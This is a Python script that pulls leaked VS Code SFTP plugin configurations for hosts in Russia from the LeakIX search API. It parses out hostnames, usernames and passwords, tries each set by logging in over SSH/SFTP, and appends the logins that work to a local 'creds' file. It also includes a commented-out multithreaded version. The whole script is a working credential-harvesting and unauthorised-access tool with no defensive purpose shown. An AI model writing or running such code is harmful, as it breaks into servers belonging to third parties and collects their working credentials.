import requests 
import json
import paramiko
import sys 
import threading
import multiprocessing

print("[!] USAGE: python3 stfp_parser.py <fromPageID> <toPageID> ")

fromPageID = sys.argv[1]
toPageID = sys.argv[2]
headers = {
"accept" : "application/json",
"api-key": "<key>"
}
lock = threading.Lock()

#https://leakix.net/search?page=0&q=%2Bplugin%3AVsCodeSFTPPlugin+%2Bcountry%3A%22Russia%22&scope=leak
def parseJsonRequest(page):
   url= "https://leakix.net/search?page={0}&q=%2Bplugin%3AVsCodeSFTPPlugin+%2Bcountry%3A%22Russia%22&scope=leak".format(page) 
   req = requests.get(url , headers = headers)
   json_data = req.json()
   
   for entry in json_data:
      summary_str = entry.get("summary")
      summary_json = json.loads(summary_str)
      
      host = summary_json.get("host")
      username = summary_json.get("username")
      password = summary_json.get("password")

      checkSuccessConnections(host , username , password)

   print("[+]Finish . Page {0} is parsed".format(page))

def connectToSFTP(host , username , password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=host , username=username , password=password)

        sftp = ssh_client.open_sftp()

        sftp.close()
        ssh_client.close()

        return True

    except Exception as e:
        print("[-] Error : {0} for host {1} with creds {2}:{3}".format(e ,host,username , password))
        return False
      

def writeToFile(credsStr):
    try:
        with open("creds", 'a') as file:
            file.write(credsStr + '\n')
            print("[+] Creds appended to the file successfully.")

    except FileNotFoundError:
        with open("creds", 'w') as file:
            file.write(credsStr)
            print("[+] File created and creds written successfully.")


def checkSuccessConnections(host , username ,password):
    if(connectToSFTP(host , username , password)):
        writeToFile("{0} | {1} | {2}".format(host , username , password))
        print("[+] Creds for host / {0} / added to file".format(host))


def enumLix():
   for x in range(int(fromPageID),int(toPageID)):
      parseJsonRequest(x)
'''
def enumLix():
    max_threads = multiprocessing.cpu_count()
    threads = []
    for x in range(int(fromPageID), int(toPageID)):
        thread = threading.Thread(target=parseJsonRequest, args=(x,))
        thread.start()
        threads.append(thread)
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []

    for thread in threads:
        thread.join()
'''

enumLix()
